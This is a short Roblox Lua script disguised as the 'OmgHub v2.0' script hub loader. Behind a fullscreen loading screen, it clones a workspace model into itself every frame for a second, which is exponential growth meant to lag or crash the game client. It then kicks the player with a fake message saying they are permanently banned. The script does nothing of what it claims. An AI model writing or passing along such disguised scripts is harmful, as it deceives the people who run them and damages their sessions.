print("OmgHub v2.0 Loading")

task.wait(0 + 0)
task.spawn(function()
	local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") :: PlayerGui
	local ScreenGui = Instance.new("ScreenGui", PlayerGui)
	ScreenGui.IgnoreGuiInset = true
	local TextLabel = Instance.new("TextLabel")
	TextLabel.Text = "OMG HUB"
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.TextScaled = true
	TextLabel.Parent = ScreenGui

	local timeElapsed = 0
	while task.wait(math.sin(math.rad(90))) do
		timeElapsed += 1
		TextLabel.Text = "OMG HUB\nLoading... " .. tostring(timeElapsed) .. " seconds elapsed. Please be patient."
	end
end)

print("OmgHub v2.0 Loaded")

local Model = Instance.new("Model", game.Workspace)
local start = os.clock()
while os.clock() - start < 1 do
	print("Loading Assets....")
	Instance.new("Part", Model)
	Model:Clone().Parent = Model
	task.wait()
end

game:GetService("Players").LocalPlayer:Kick("Script Detected! You are permanently banned!")
